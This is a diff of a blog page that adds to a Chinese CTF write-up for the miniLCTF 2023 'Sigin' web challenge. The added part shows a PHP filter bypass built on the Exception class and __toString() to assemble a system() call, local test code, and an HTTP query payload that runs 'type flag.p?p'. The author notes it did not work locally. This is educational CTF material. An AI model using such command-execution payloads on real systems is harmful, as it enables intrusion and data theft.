@@ -66,7 +66,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sigin"><span class="toc-text">Sigin</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sigin-%E5%A4%8D%E7%8E%B0"><span class="toc-text">Sigin(复现)</span></a></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -223,7 +223,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ff7d73">CTF线上赛</a>
+                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #03a9f4">CTF线上赛</a>
             </span>
             
         </span>
@@ -237,7 +237,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">139字</span>
+        <span class="post-count">382字</span>
       </span>
     </span>
 
@@ -260,7 +260,7 @@
 <p><a target="_blank" rel="noopener" href="https://github.com/XDSEC/miniLCTF_2023/blob/main/Official/Web.md">官方wp</a></p>
 <span id="more"></span>
 
-<h1 id="Sigin"><a href="#Sigin" class="headerlink" title="Sigin"></a>Sigin</h1><blockquote>
+<h1 id="Sigin-复现"><a href="#Sigin-复现" class="headerlink" title="Sigin(复现)"></a>Sigin(复现)</h1><blockquote>
 <p>php</p>
 </blockquote>
 <p>index页面f12发现注释<code>shell.php</code></p>
@@ -296,6 +296,28 @@
 
 <span class="token comment">//flag.php</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>先分析一下代码，对参数$a过滤了<code>Error</code>，<code>ArrayIterator</code>，<code>SplFileObject</code>这三个原生类，这三个类的共同点我猜测是能够读取文件</p>
+<p>然后对参数$b过滤了<code>php</code>，那等会还读取flag.php还得使用通配符</p>
+<p>接着对参数$c过滤了<code>Error</code>，<code>ArrayIterator</code>类</p>
+<p>而<code>$str1($str2)</code>存在代码执行，接下来就是要选择合适的类获得<code>$class</code>让<code>$str1($str2)</code>变得可控</p>
+<p>在这种过滤条件下，与<code>Error</code>类作用相似的还有<code>Exception</code>类</p>
+<p>通过<code>Exception</code>类中的<code>__toString()</code>方法获取字符串来触发</p>
+<p>本地测试：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"systemtype%20flag.p?p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$class</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token variable">$str1</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$str1</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$str2</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>输出：</p>
+<p><img src="/blog/2023/05/01/miniLCTF-2023/image-20230625115606692.png" alt="image-20230625115606692"></p>
+<p>很明显这样就能实现命令执行读取flag</p>
+<p>payload(本地windows环境)：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">?a=Exception&amp;b=systemtype%20flag.p?p&amp;c=__toString&amp;d=11&amp;e=6&amp;f=17&amp;g=15<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>但是不知道为什么本地复现的时候没打通qaq</p>
 
     </div>
     
